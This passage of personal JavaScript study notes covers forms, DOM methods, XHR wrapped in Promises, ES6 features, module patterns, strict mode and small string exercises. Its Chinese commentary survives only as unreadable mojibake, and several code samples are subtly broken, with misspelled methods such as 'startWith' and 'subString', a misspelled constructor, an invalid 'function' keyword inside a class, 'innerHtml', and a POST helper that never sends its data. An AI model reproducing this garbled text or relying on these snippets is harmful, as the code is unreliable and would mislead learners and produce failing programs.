value=&quot;sking&quot;&gt;Sking&lt;/br&gt; &lt;input type=&quot;checkbox&quot; name=&quot;diving&quot; value=&quot;diving&quot;&gt;Diving&lt;/br&gt; &lt;label for=&quot;colour&quot;&gt;Fav colour: &lt;/label&gt; &lt;select name=&quot;colour&quot;&gt; &lt;option&gt;Red&lt;/option&gt; &lt;option&gt;Blue&lt;/option&gt; &lt;option&gt;Green&lt;/option&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&#39;Submit&#39;&gt; &lt;/form&gt; &lt;/div&gt; &lt;script src=&quot;test.js&quot;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; var myForm = document.forms.myForm//myFormæ˜¯è¿™ä¸ªFormæ ‡ç­¾çš„nameå±æ€§,formæ˜¯è·Ÿinputé…åˆä½¿ç”¨çš„ myForm.name &gt; é‚£ä¸ªinputæ ‡ myForm.name.value &gt; é‚£ä¸ªinputæ ‡ç­¾ï¼Œå…¶å®ä¹Ÿå°±æ˜¯é‚£ä¸ªè¾“å…¥æ¡†é‡Œé¢çš„æ–‡å­— myForm.colour.vaule &gt; æ˜¾ç¤ºå½“å‰é€‰ä¸­çš„selectå€¼ è¿˜æ˜¯ä¸Šé¢é‚£ä¸ªè¡¨å• var myForm = document.forms.myForm var message = document.getElementById(&#39;message&#39;) myForm.onsubmit = function () {//å°±æ˜¯ä¸Šé¢é‚£ä¸ªsubmitè¢«ç‚¹å‡»æ—¶è§¦å‘ if(myForm.name.value === &#39;&#39;){ message.innerHtml = &#39;please enter an not empty name&#39; return false //summitäº‹ä»¶è¢«ç»ˆæ­¢ }else { message.innerHtml = &#39;&#39; return true } } div.innerHtmlï¼ˆæŠŠæ•´ä¸ªhtmlå¯¹è±¡éƒ½è¿”å›äº†ï¼‰å’Œdiv.textContent(åªè¿”å›æ–‡å­—)ã€‚æ‰€ä»¥innerHtmlå¯ä»¥ç”¨æ¥æŠŠä¸€ä¸ªdivé‡Œé¢çš„tagå…¨éƒ¨æ›¿æ¢æ‰ï¼ˆæ¯”å¦‚åŸæ¥æ˜¯ä¸ªpï¼Œç°åœ¨æ¢æˆh1ï¼‰ï¼Œè€ŒtextContentåªèƒ½æŠŠæŸä¸€ä¸ªtagé‡Œé¢çš„æ–‡å­—æ”¹æ‰ã€‚æƒ³è¦æ”¹hrefçš„è¯ï¼Œå¾—è¿™æ ·ï¼š var link = document.getElementById(&quot;abc&quot;); link.setAttribute(&quot;href&quot;, &quot;xyz.php&quot;); setAttribute()å¯ä»¥ç”¨äºè®¾ç½®ä¸€ä¸ªåœ¨å½“å‰tagä¸Šä¸å­˜åœ¨çš„attrè®¾ç½®classå¯ä»¥ç”¨setAttribute(â€˜classâ€™,â€™XXXâ€™)ï¼Œä¹Ÿå¯ä»¥ç”¨div.className = â€˜XXXâ€™å¯¹äºä¸€ä¸ªaæ ‡ç­¾ &lt;a href=&quot;/subpage&quot;&gt;Some Thing&lt;/a&gt; è¿™æ—¶å€™è°ƒç”¨a.href &gt; ä¼šè¾“å‡ºâ€™http://www.host.com/subpage&#39;ï¼Œå³è¾“å‡ºå®Œæ•´çš„è·¯å¾„ä½†æ˜¯å¦‚æœä½¿ç”¨a.getAttribute(â€˜hrefâ€™) &gt; è¾“å‡ºâ€™/subpageâ€™ æ”¹ä¸€ä¸ªtagçš„èƒŒæ™¯å…ƒç´ ä¸èƒ½è¿™ä¹ˆæ”¹ï¼š a.style.background-color= &#39;blue&#39; //å¾—è¿™æ · a.style.backgroundColor= &#39;blue&#39;//å…¶å®å°±æ˜¯æ¨ªçº¿æ¢æˆCammelCase åœ¨domä¸­æ–°å¢ä¸€ä¸ªelementçš„æ–¹æ³•`javaScriptvar li = document.createElement(â€˜liâ€™) //åˆ›å»ºä¸€ä¸ªæ–°çš„liæ ‡ç­¾,parentTag.appendChild(li)//æ·»åŠ åˆ°å°¾éƒ¨parentTag.insertBefore(li,parentTag.getElementsByTagName(â€˜liâ€™)[0])//æ·»åŠ åˆ°åŸæ¥çš„0å…ƒç´ å‰é¢ //åˆ é™¤ä¸€ä¸ªtagçš„è¯var removed = parentTag.removeChild(li)//ç§»é™¤æ–¹æ³•ä¼šè¿”å›è¢«ç§»é™¤çš„å…ƒç´  ## 3.ä»onclickå¼€å§‹åˆ°æ•´ä¸ªäº¤äº’äº‹ä»¶æ¨¡å‹ ## 4. å¼‚æ­¥çš„å®ç° é¦–å…ˆjsé‡Œé¢ä¹Ÿæ˜¯æœ‰callback hellè¿™ç§æ¦‚å¿µçš„ï¼Œä¸€ä¸ªæ¥å£å¥½äº†è¯·æ±‚å¦ä¸€ä¸ªæ¥å£ï¼Œå¥½äº†ä¹‹ååœ¨è¯·æ±‚ç¬¬ä¸‰ä¸ªæ¥å£ï¼Œè¿™æ ·ä¸€å±‚å¥—ä¸€å±‚è°ä¹Ÿä¸å–œæ¬¢ã€‚ ```js var http = new XMLHttpRequest(); http.onreadystatechange=function(){ if(http.readyState==4&amp;&amp;http.status==200){ console.log(JSON.parse(http.response)) } }; http.open(&quot;GET&quot;,&#39;data/tweets.json&#39;,true); http.send(); ä¸Šé¢è¿™æ®µç›´æ¥åœ¨chromeé‡Œé¢è·‘çš„è¯ä¼šå‡ºé”™ï¼š Cross origin requests are only supported for protocol schemes: http, data, chrome, chrome-extension, https Chrome é»˜è®¤ä¸æ”¯æŒè·¨åŸŸè¯·æ±‚ï¼Œå¯åŠ¨æ—¶è¦åŠ ä¸Šä¸ªflagå°±è¡Œäº† ajaxçš„readyStateæœ‰å››ç§ request not initialized request has been set up request has been set request is in process request is complete ajaxçš„openç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¼‚æ­¥è¿˜æ˜¯åŒæ­¥ï¼Œä¸€èˆ¬éƒ½å¾—å¼‚æ­¥ã€‚ç”±äºjsæ˜¯å•çº¿ç¨‹çš„ï¼Œæ‰€ä»¥ä¼šæŠŠå®é™…çš„ç½‘ç»œè¯·æ±‚å·¥ä½œæ”¾åˆ°ä¸€æ¡jsä»¥å¤–çš„çº¿ç¨‹ä¸­ï¼Œå®Œæˆåä¸¢åˆ°å½“å‰jsçº¿ç¨‹ä»»åŠ¡æ± çš„æœ€åã€‚ å½“å‰çº¿ç¨‹çš„ä»»åŠ¡å®Œæˆåå°±å¯ä»¥æ‰§è¡Œè¿™æ®µå›è°ƒ ES6æä¾›äº†Promiseï¼Œèƒ½å¤Ÿå°†äº‹æƒ…ç®€åŒ–ã€‚xhrç”¨PromiseåŒ…è£…ä¸€ä¸‹æ˜¯è¿™æ ·çš„ï¼š //promise(ES6) is a placeholder for something that will happen in the future function getViaPromise(url) { var promise = new Promise((resolve ,reject) =&gt; { let client = new XMLHttpRequest(); client.open(&#39;GET&#39;,url,true); client.onreadystatechange = () =&gt; { if(client.readyState === 4 ) { if(client.status === 200 ){ resolve(client.responseText); // console.log(&quot;response of GET Arrived&quot;); } else { var reason = { code : client.status, response: client.resonse }; reject(reason); } } }; client.send() }); return promise; } function postViaPromise(url ,data) { return new Promise((resolve,reject) =&gt; { let client = new XMLHttpRequest(); client.open(&quot;POST&quot;, url ,true); client.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); client.onreadystatechange = () =&gt; { if (client.readyState === 4) { if(client.status &gt;=200 &amp;&amp; client.status &lt;=400 ){ resolve(client.responseText); // console.log(&quot;response of POST Arrived&quot;); } else { let reason = { &#39;code&#39;: client.status, &quot;response&quot;: client.response} reject(reason); } } } client.send(); }); } //ä½¿ç”¨çš„æ—¶å€™ï¼š //å¯ä»¥æŠŠä¸¤ä¸ªpromiseåˆå¹¶åœ¨ä¸€èµ·ï¼Œç­‰åˆ°ä¸¤ä¸ªéƒ½æ‰§è¡Œå®Œæ¯•å†å»åšä¸€äº›æ“ä½œ let p1 = getViaPromise(&quot;https://jsonplaceholder.typicode.com/posts&quot;); let data = { &quot;userId&quot;: 1, &quot;id&quot;: 2, &quot;title&quot;: &quot;dumb post&quot;, &quot;body&quot;: &quot;this is some dumb post , dont care&quot; } let p2 = postViaPromise(&quot;https://jsonplaceholder.typicode.com/posts&quot;,data); Promise.all([p1,p2]).then(values =&gt; { console.log(values); }); //ä¹Ÿå¯ä»¥åœ¨ä¸€ä¸ªå®Œæˆä¹‹åå†å»æ‰§è¡Œå¦å¤–ä¸€ä¸ª let data = { &quot;userId&quot;: 1, &quot;id&quot;: 2, &quot;title&quot;: &quot;dumb post&quot;, &quot;body&quot;: &quot;this is some dumb post , dont care&quot; }; let p1 = getViaPromise(&quot;https://jsonplaceholder.typicode.com/posts&quot;); let p2 = postViaPromise(&quot;https://jsonplaceholder.typicode.com/posts&quot;,data); p1.then( data =&gt; { console.log(`data of Promise1 is ${data}` ); return p2; } ).then(data =&gt; { console.log(`data of promise2 is ${data}`); }).catch(err =&gt; { console.log(err); }); æ›´åŠ æœ‰æ•ˆçš„æ–¹å¼æ˜¯ä½¿ç”¨generatorï¼Œè¿˜ä¸æ˜¯å¾ˆäº†è§£ function* gen() { yield 10; } var myGen = gen() // myGen.done //myGen.value() 5. ES6æ–°å¢çš„ä¸€äº›ä¸œè¥¿let(lexical)çš„ç”¨æ³•å°±åœ¨ä¸€ä¸ªå¾ªç¯é‡Œç»™functionèµ‹å€¼ï¼Œå¾ˆå¸¸è§ã€‚æ³¨æ„çš„æ˜¯varçš„ä½œç”¨åŸŸæ˜¯è·¨å¤§æ‹¬å·çš„ã€‚æ‰€ä»¥å¤§æ‹¬å·é‡Œé¢çš„varæ˜¯èƒ½è¢«å¤§æ‹¬å·å¤–é¢è®¿é—®çš„ï¼Œletå°±ä¸è¡Œã€‚async await éƒ½æ˜¯ES2017ï¼ˆæ¯”ES2015æ›´é«˜çš„ç‰ˆæœ¬ï¼‰ä¸­å‡ºç°çš„ã€‚ asyncå’Œawaitå¾ˆç®€å•çš„ï¼Œéšä¾¿å®šä¹‰ä¸€ä¸ªæ–¹æ³•ï¼Œæ–¹æ³•å®šä¹‰å‰é¢åŠ ä¸€ä¸ªasyncï¼Œè¿™é‡Œé¢å°±èƒ½éšä¾¿å†™awaitäº†ï¼Œ await Promiseå°±å¯ä»¥äº†ã€‚ default parametersï¼š é»˜è®¤å‚æ•°ï¼Œå’Œpythonä¸­å¾ˆåƒ function myLog(name,age,id){ } function myDefaultFunction(name=&#39;john&#39;,age=27,id =100){ } // è°ƒç”¨ï¼š myDefalutFunction()// ä¸ä¼ å‚ä¹Ÿå¯ spread operator var num1 = [1,2,3] var num2 = [num1,5,6] console.log(num2) // var num2 = [num1,5,6] var num2 = [...num1,5,6] //ä¸‰ä¸ªç‚¹ console.log(num2) // (5) [1, 2, 3, 5, 6] //å¦å¤–ä¸€ä¸ªç”¨å¤„ var num3 = [1,2,3] function acceptAnArray(a,b,c){ console.log(a+b+c) } //è°ƒç”¨ acceptAnArray(...num3) // è¾“å‡º6 template String(è¿™ä¸ªä¸æ˜¯å¼•å·ï¼Œæ˜¯åœ¨tabé”®ä¸Šé¢é‚£ä¸ª) var myString = `This is an template String , note we have some line break here,that will be honored. Also there are some whiteSpace afront , which will be honored too` console.log(myString) var nextString = `This is ` function logLiteralString(name,age) { console.log(`the name is ${name} and the age is ${10+12}`); } // the name is hhaha and the age is 22 ã€‚ String literals. Stringæ–°å¢äº†ä¸€äº›æ–¹æ³• var str = &#39;hahhaha&#39; console.log(str.repeat(3)); // hahhahahahhahahahhaha var str2 = &#39;goodbye&#39; console.log(str2.startWith(&#39;good&#39;)); // true console.log(str2.startWith(&#39;bye&#39;,4)); // true console.log(str2.endsWith(&#39;good&#39;)); //false console.log(str2.endsWith(&#39;good&#39;,str2.length-3)); //true var str3 = &#39;Good Day&#39; console.log(str3.includes(&#39;Day&#39;)); //true Object Literal notation // es5å¾—è¿™ä¹ˆå†™ var name = &#39;Josh&#39; var age = 27 var person = { name: name, age: age, greet: function (X) { console.log(`you say ${X} in your greets`); } } // es6è¿™æ ·å°±è¡Œäº† var person = { name,age, greet(X){ console.log(`you say ${X} in your greets`); } } ç®€æ˜å¾ˆå¤š Arrow Functionï¼ˆç®­å¤´å‡½æ•°ï¼‰ window.onload = function () { var stuff = function () { console.log(&#39;say Stuff&#39;); } var stuff2 = () =&gt;{ console.log(&#39;this is more precise&#39;); } var stuff3 = () =&gt; console.log(&#39;åªæœ‰ä¸€è¡Œçš„è¯å¯ä»¥ä¸è¦å¤§æ‹¬å·&#39;); var stuff4 = (name) =&gt; console.log(`the name is ${name} and hi`); var stuff5 = name =&gt; console.log(`åªæœ‰ä¸€ä¸ªå‚æ•° ${name}çš„è¯ï¼Œå‚æ•°çš„å°æ‹¬å·ä¹Ÿä¸è¦äº†`); } è¿˜æœ‰ä¸€ä¸ªå¥½å¤„å°±æ˜¯: the arrow function will bind the this keyword lexically. window.onload = function () { var jam = { name : &#39;Jane&#39;, greeting: function (X) { window.setInterval(function () { if (X&gt;0) { console.log(this.name+&#39; greet you&#39;); } },500) } } jam.greeting(3) } // è¾“å‡º greet you åŸå› æ˜¯thiså·²ç»ä¸æ˜¯jamè¿™ä¸ªobjectäº†ï¼Œä¹Ÿå°±æ˜¯é—­åŒ…é—®é¢˜.es6ä¹‹å‰ç”¨ä¸‹é¢è¿™ç§æ–¹å¼è§„é¿ä¸€ä¸‹ window.onload = function () { var jam = { name : &#39;Jane&#39;, greeting(X) { var _this =this; window.setInterval(function () { if (X&gt;0) { console.log(_this.name+&#39; greet you&#39;); X--; } },500) } } jam.greeting(3) } window.onload = function () { var jam = { name : &#39;Jane&#39;, greeting(X) { window.setInterval(() =&gt; { if (X&gt;0) { console.log(this.name+&#39; greet you&#39;); X--; } },500) } } jam.greeting(3) } class definitiones6 æ–°å¢äº†classçš„æ¦‚å¿µï¼Œè¿˜æœ‰extendsçš„æ¦‚å¿µ class Band { constructor(name ,location) { this.name = name; this.location = location; } function greet() { console.log(this.name); } } class SubBand extends Band { construcor(name ,location,popularity) { super(name ,location); // this is essential , å¦‚æœåé¢æƒ³è¦ä½¿ç”¨parent çš„å±æ€§çš„è¯ï¼Œéœ€è¦åŠ ä¸Šsuper() this.popularity = popularity; } } // è°ƒç”¨ let garage = new Band(&#39;john&#39;, &#39;Doe&#39;); garage.greet(); Setsæ˜¯æ–°å¢çš„ç”¨äºå­˜å‚¨uniqueæ•°æ®çš„é›†åˆ(å…ƒç´ ä¸èƒ½é‡å¤) var names = new Set(); names.add(&quot;josh&quot;).add(&#39;bob&#39;).add(&#39;neo&#39;) console.log(names); console.log(names.size); names.delete(&#39;bob&#39;) // è¿”å›trueè¡¨ç¤ºåˆ é™¤æˆåŠŸï¼Œfalseè¡¨ç¤ºåˆ é™¤å¤±è´¥ names.clear() names.has(&#39;bob&#39;) //å°±æ˜¯containsçš„æ„æ€ var duplicatedArray = [1,2,&#39;jane&#39;,&#39;harry&#39;,2]; var undepulicatedSet = new Set(duplicatedArray); console.log(undepulicatedSet); duplicatedArray = [...undepulicatedSet] //ä½¿ç”¨spread operaterå°†setå˜æˆå„ä¸ªå•ä¸€çš„å…ƒç´  console.log(duplicatedArray); addçš„æ—¶å€™å¦‚æœå­˜åœ¨é‡å¤å…ƒç´ ç›´æ¥æ— è§†æ–°å¢çš„é‡å¤å…ƒç´  6. æˆ‘ä¹Ÿä¸çŸ¥é“å½’åˆ°å“ªä¸€ç±»çš„é—®é¢˜ jsè¯­æ³•ä¸Šè™½è¯´ä¸ç”¨åŠ åˆ†å·ï¼Œä½†å®é™…åº”ç”¨ä¸­ä¸ºé¿å…å‹ç¼©jsæ–‡ä»¶æ—¶å‡ºç°æ­§ä¹‰ï¼Œè¿˜æ˜¯å¾—è€è€å®å®åŠ ä¸Šåˆ†å· js æ˜¯å¤§å°å†™æ•æ„Ÿçš„ IIFE(Immediately Invoked Function Expression) Library use this to avoid polluting global environmentå£°æ˜äº†ä¹‹åç«‹åˆ»è°ƒç”¨è¯¥å‡½æ•°æ‰§è¡Œ iifeçš„ä¾‹å­: (function () {console.log(&#39;this is invoked!&#39;)})(); // iifeçš„å¥½å¤„æ˜¯åªå¯¹å¤–æä¾›å¿…è¦åŠŸèƒ½ï¼Œå†…éƒ¨æˆå‘˜ä¸ç”¨æš´éœ²ç»™å¤–éƒ¨(è¿™åœ¨æ¨¡å—åŒ–é‡Œé¢å°±å¾ˆé‡è¦äº†ï¼Œä½œä¸ºä¸€ä¸ªmoduleï¼Œä¸€äº›å†…éƒ¨çš„private methodä¸å¸Œæœ›å¯¹å¤–å…¬å¼€ï¼Œå°±å¯ä»¥ç”¨iifeå†™ï¼ŒåŒæ—¶è¿™ä¹Ÿé¿å…äº†polluting global nameSpace)ã€‚ Javascriptæ¨¡å—çš„åŸºæœ¬å†™æ³• var module1 = (function(){ var _count = 0; var m1 = function(){ //... }; var m2 = function(){ //... }; return { m1 : m1, m2 : m2 }; })(); console.info(module1._count); //undefined // æ”¾å¤§æ¨¡å¼&quot;ï¼ˆaugmentationï¼‰ï¼Œä¸€ä¸ªæ¨¡å—ç»§æ‰¿å¦ä¸€ä¸ªæ¨¡å— var module1 = (function (mod){ mod.m3 = function () { //... }; return mod; })(module1); // å®½æ”¾å¤§æ¨¡å¼ï¼ˆLoose augmentationï¼‰ var module1 = ( function (mod){ //... return mod; })(window.module1 || {}); Javascriptæ¨¡å—åŒ–ç¼–ç¨‹ï¼ˆä¸€ï¼‰ï¼šæ¨¡å—çš„å†™æ³•iifeçš„ä¸€ç¯‡ç¿»è¯‘çš„æ–‡ç«  Paul Irishçš„è§†é¢‘ä¸­æåˆ°äº†jQueryçš„Sourceä¸­ç”¨åˆ°äº†è¿™ç§åšæ³•ã€‚ å¦‚æœå¼•ç”¨ä¸€ä¸ªæœªå£°æ˜çš„å˜é‡ï¼Œjsä¼šç›´æ¥åˆ›å»ºä¸€ä¸ªï¼ˆé™¤éä½¿ç”¨use strictï¼‰ &#39;use strict&#39;; new Promise(function () {}); use strictæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ åœ¨æ­£å¸¸æ¨¡å¼ä¸­ï¼Œå¦‚æœä¸€ä¸ªå˜é‡æ²¡æœ‰å£°æ˜å°±èµ‹å€¼ï¼Œé»˜è®¤æ˜¯å…¨å±€å˜é‡ã€‚ä¸¥æ ¼æ¨¡å¼ç¦æ­¢è¿™ç§ç”¨æ³•ï¼Œå…¨å±€å˜é‡å¿…é¡»æ˜¾å¼å£°æ˜ã€‚ &quot;use strict&quot;; v = 1; // æŠ¥é”™ï¼Œvæœªå£°æ˜ for(i = 0; i &lt; 2; i++) { // æŠ¥é”™ï¼Œiæœªå£°æ˜ } æ„æ€å¤§æ¦‚å°±æ˜¯ &quot;use strict&quot;; x = 3.14; // æŠ¥é”™ (x æœªå®šä¹‰)ä½†æ­£å¸¸ä¸ä¼šæŠ¥é”™çš„ ä¸å…è®¸åˆ é™¤å˜é‡æˆ–å¯¹è±¡ã€‚ä¸å…è®¸åˆ é™¤å‡½æ•°ã€‚ä¸å…è®¸å˜é‡é‡å:ã€‚ã€‚ã€‚ã€‚æ€»ä¹‹æ„Ÿè§‰è·Ÿlintæœ‰ç‚¹åƒ undefinedå’Œnullçš„å…³ç³»null: absence of value for a variable; undefined: absence of variable itself;what-is-the-difference-between-null-and-undefined-in-javascript undefinedçš„æ„æ€æ˜¯äº‹å…ˆå£°æ˜äº†ä¸€ä¸ªvarä½†æ²¡æœ‰ç»™èµ‹å€¼ï¼Œnullæ˜¯ä¸€ä¸ªobjectï¼Œè¡¨ç¤ºno valueã€‚typeof(Undefined) = â€˜undefinedâ€™, typeof(â€˜Nullâ€™) = â€˜objectâ€™why-is-there-a-null-value-in-javascriptnull is a special keyword that indicates an absence of value. var foo; defined empty variable is null of datatype undefined //è¿™ç§å£°æ˜äº†ä½†æ˜¯æ²¡ç»™èµ‹å€¼çš„å˜é‡çš„å€¼æ˜¯null,æ•°æ®ç±»å‹æ˜¯undefined var a = &#39;&#39;; console.log(typeof a); // string console.log(a == null); //false console.log(a == undefined); // false // ä¸¤ä¸ªç­‰å·è¡¨ç¤ºåªæ£€æŸ¥value var a; console.log(a == null); //true console.log(a == undefined); //true // ä¸‰ä¸ªç­‰å·è¡¨ç¤ºæ—¢æ£€æŸ¥valueä¹Ÿæ£€æŸ¥type var a; console.log(a === null); //false console.log(a === undefined); // true var a = &#39;javascript&#39;; a = null ; // will change the type of variable &quot;a&quot; from string to object jsçš„æ•°æ®ç±»å‹åŒ…æ‹¬ï¼šNumber,String,Boolean,Object,Function,Undefinedå’ŒNull jsä¸­æ˜¯å­˜åœ¨ä¸€äº›å…¨å±€å±æ€§å’Œå…¨å±€å‡½æ•°çš„æ¯”å¦‚Infinity(ä»£è¡¨æ­£çš„æ— ç©·å¤§),NaN(æŒ‡æŸä¸ªå€¼æ˜¯ä¸æ˜¯æ•°å­—)å…¨å±€çš„å‡½æ•°æ¯”å¦‚decodeURI(),escape(),eval(),parseInt(),parseFloat()ï¼Œè¿™äº›æ–¹æ³•ä¸å±äºä»»ä½•å¯¹è±¡ è¿™ä¸¤ä¸ªå‡½æ•°éƒ½æ¥å—Stringä½œä¸ºå‚æ•° parseInt(&quot;10&quot;); //è¿”å› 10 parseFloat(&quot;10.33&quot;) // è¿”å›10.33 There is only the Number data type in JS that represents numbers.Internally it is implemented as IEEE 754 double precision floating point number. ä¸¥æ ¼æ„ä¹‰ä¸Šè®²ï¼ŒjavaScriptä¸­ä¸å­˜åœ¨intç±»å‹ï¼Œå…¨éƒ¨å­˜å‚¨ä¸ºdoubleç²¾ç¡®åº¦çš„floating pointã€‚ 9. äº¤äº’äº‹ä»¶çš„æ•è·ï¼Œæ‹¦æˆªï¼Œæ¶ˆè´¹ï¼ˆå†’æ³¡ï¼‰//æ·»åŠ ç‚¹å‡»äº‹ä»¶ç‚¹å‡»äº‹ä»¶ï¼š var button = document.getElementById(&#39;btn&#39;) button.onclick = function () { console.log(&#39;you click this button&#39;); } button.onfocus = function() { // body... } button.onblur = function () { // } function cancelEvent(e) { if(e) { e.stopPropagation(); //éIE } else { window.event.cancelBubble = true; //IE } } åœ¨ä¸€ä¸ªå…ƒç´ ä¸Šè§¦å‘äº‹ä»¶ï¼Œå¦‚æœæ­¤å…ƒç´ å®šä¹‰äº†å¤„ç†ç¨‹åºï¼Œé‚£ä¹ˆæ­¤æ¬¡äº‹ä»¶å°±ä¼šè¢«æ•è·ï¼Œæ ¹æ®ç¨‹åºè¿›è¡Œè¯¥äº‹ä»¶çš„å¤„ç†ã€‚å¦åˆ™è¿™ä¸ªäº‹ä»¶ä¼šæ ¹æ®DOMæ ‘å‘çˆ¶èŠ‚ç‚¹é€çº§ä¼ æ’­ï¼Œå¦‚æœä»å§‹è‡³ç»ˆéƒ½æ²¡æœ‰è¢«å¤„ç†ï¼Œé‚£ä¹ˆæœ€ç»ˆä¼šåˆ°è¾¾documentæˆ–windowæ ¹å…ƒç´ ã€‚æ‰€ä»¥äº‹ä»¶æ˜¯å¾€ä¸Šä¼ é€’çš„ï¼Œå³å†’æ³¡ã€‚ äº‹ä»¶æ³¨å†Œçš„æ—¶æœºå¯¹äºç®€å•çš„scriptï¼Œéœ€è¦åœ¨bodyçš„æœ€åä¸€è¡Œï¼Œå› ä¸ºæµè§ˆå™¨æ˜¯ä»ä¸Šåˆ°ä¸‹è§£æçš„ï¼Œè½®åˆ°scriptè§£æçš„æ—¶å€™ï¼Œéœ€è¦æ“ä½œdomï¼Œè¿™å°±è¦æ±‚domå…ƒç´ å·²ç»å»ºç«‹å¥½ã€‚æœ‰æ—¶å€™ï¼Œå°±ç®—ä½ æŠŠscriptå†™åœ¨bodyæœ€åä¸€è¡Œï¼Œè½®åˆ°è§£æscriptçš„æ—¶å€™ï¼Œå‰é¢çš„htmlè¿˜åœ¨åŠ è½½ï¼ˆæ¯”å¦‚è¯´éå¸¸å¤§çš„htmlä»€ä¹ˆçš„ï¼Œæ€»ä¹‹æ˜¯æœ‰å¯èƒ½çš„ï¼‰ã€‚æ‰€ä»¥ä¸€èˆ¬ç”¨window.onLoadæ¥æ³¨å†Œäº‹ä»¶ã€‚ å¤æ‚ç‚¹çš„scriptæ”¾åœ¨å¤–é¢ï¼Œç”¨srcå¼•ç”¨ã€‚ ä¹Ÿè¦ç”¨window.onLoadæ¥æ³¨å†Œäº‹ä»¶ã€‚æ‰€ä»¥ï¼Œä¸€èˆ¬çš„jsé•¿è¿™æ ·ï¼ˆå‡å¦‚çš„ä½ jsè¦æ“ä½œdomï¼‰ï¼š function setUpEvents() { var button = .... var .... button.onclick = function () { // } button. } window.onLoad = function () { setUpEvents() } thisçš„ä½œç”¨èŒƒå›´ä»£ç æ¥æº &lt;script src=&quot;https://cdn.jsdelivr.net/npm/axios@0.12.0/dist/axios.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.jsdelivr.net/npm/lodash@4.13.1/lodash.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; var watchExampleVM = new Vue({ el: &#39;#watch-example&#39;, data: { question: &#39;&#39;, answer: &#39;I cannot give you an answer until you ask a question!&#39; }, watch: { // å¦‚æœ `question` å‘ç”Ÿæ”¹å˜ï¼Œè¿™ä¸ªå‡½æ•°å°±ä¼šè¿è¡Œ question: function (newQuestion) { this.answer = &#39;Waiting for you to stop typing...&#39; this.getAnswer() } }, methods: { // `_.debounce` æ˜¯ä¸€ä¸ªé€šè¿‡ Lodash é™åˆ¶æ“ä½œé¢‘ç‡çš„å‡½æ•°ã€‚ // åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¸Œæœ›é™åˆ¶è®¿é—® yesno.wtf/api çš„é¢‘ç‡ // AJAX è¯·æ±‚ç›´åˆ°ç”¨æˆ·è¾“å…¥å®Œæ¯•æ‰ä¼šå‘å‡ºã€‚æƒ³è¦äº†è§£æ›´å¤šå…³äº // `_.debounce` å‡½æ•° (åŠå…¶è¿‘äº² `_.throttle`) çš„çŸ¥è¯†ï¼Œ // è¯·å‚è€ƒï¼šhttps://lodash.com/docs#debounce getAnswer: _.debounce( function () { if (this.question.indexOf(&#39;?&#39;) === -1) { this.answer = &#39;Questions usually contain a question mark. ;-)&#39; return } this.answer = &#39;Thinking...&#39; var vm = this //è¿™é‡Œéœ€è¦æŠŠthisï¼ˆVewComponentï¼‰ä½œä¸ºä¸€ä¸ªå˜é‡ axios.get(&#39;https://yesno.wtf/api&#39;) .then(function (response) { vm.answer = _.capitalize(response.data.answer) }) .catch(function (error) { vm.answer = &#39;Error! Could not reach the API. &#39; + error }) }, // è¿™æ˜¯æˆ‘ä»¬ä¸ºåˆ¤å®šç”¨æˆ·åœæ­¢è¾“å…¥ç­‰å¾…çš„æ¯«ç§’æ•° 500 ) } }) &lt;/script&gt; 7. å°æµ‹è¯•å¦‚ä½•ç”¨jsåè½¬ä¸€ä¸ªString function reverse(s){ return s.split(&quot;&quot;).reverse().join(&quot;&quot;); } // å¦ä¸€ç§æ–¹å¼ function revserse2(s){ let revString = &quot;&quot;; for(let i = s.length; i&gt;=0;i--) { revString = revString+str[i]; } return revString; } // ç”¨forEachçš„è¯ function reverse3(string) { let revString = &quot;&quot;; string.split(&#39;&#39;).forEach((c) =&gt; { revString = c + revString; }); return revString; } function reverse4(string){ return string.split(&#39;&#39;).reduce(function(revString, char) { return char + revString; },&#39;&#39;); } åè½¬ä¸€ä¸ªintfunction reverseInt(int) { const revString = int.toString().split(&#39;&#39;).reverse().join(&#39;&#39;); return parseInt(revString)*Math.sign(int); } é¦–å­—æ¯å¤§å†™function capitalizedLetters(str){ const strArr = str.toLowerCase().split(&#39; &#39;); for(let i=0;i&lt;strArr.length;i++){ strArr[i] = strArr[i].subString(0,1).toUpperCase()+ strArr[i].subString(1); } return strArr.join(&#39; &#39;); } function capitalizedLetters2(str){ return str .toLowerCase() .split(&#39; &#39;) .map( (word) =&gt; word[0].toUpperCase()+word.subString[1]) .join(&#39; &#39;); } how about shuffle an array/** * Shuffles array in place. * @param {Array} a items An array containing the items. */ function shuffle(a) { var j, x, i; for (i = a.length - 1; i &gt; 0; i--) { j = Math.floor(Math.random() * (i + 1)); x = a[i]; a[i] = a[j]; a[j] = x; } } // Used like so var arr = [2, 11, 37, 42]; shuffle(arr); console.log(arr); jså»åˆ·æ–°å½“å‰é¡µé¢ï¼Œè¿”å›ä¸Šçº§é¡µé¢ã€‚ã€‚ &lt;a href=&quot;javascript:history.go(-1)&quot;&gt;è¿”å›ä¸Šä¸€é¡µ&lt;/a&gt; &lt;a href=&quot;javascript:location.reload()&quot;&gt;åˆ·æ–°å½“å‰é¡µé¢&lt;/a&gt; &lt;a href=&quot;javascript:&quot; onclick=&quot;history.go(-2); &quot;&gt;è¿”å›å‰ä¸¤é¡µ&lt;/a&gt; &lt;a href=&quot;javascript:&quot; onclick=&quot;self.location=document.referrer;&quot;&gt;è¿”å›ä¸Šä¸€é¡µå¹¶åˆ·æ–°&lt;/a&gt; &lt;a href=&quot;javascript:&quot; onclick=&quot;history.back(); &quot;&gt;è¿”å›ä¸Šä¸€é¡µ&lt;/a&gt; 10. ç›‘å¬å…³é—­çª—å£äº‹ä»¶window.onbeforeunload = function () { return &quot;Bye now!&quot; } JavaScriptä½¿ç”¨å“ªä¸€ç§ç¼–ç ï¼Ÿ,ä¸æ˜¯utf-8 atomå®‰è£…æ’ä»¶è¢«å¢™é—®é¢˜Atomæ¨èæ’ä»¶atom-beautify setTimeoutæ˜¯scheduleä¸€ä¸ªtaskï¼ŒsetIntervalæ˜¯è®¾å®šä¸€ä¸ªå‘¨æœŸæ€§æ‰§è¡Œçš„ä»»åŠ¡ã€‚è¿˜æœ‰requestAnimationFrameä»€ä¹ˆçš„ 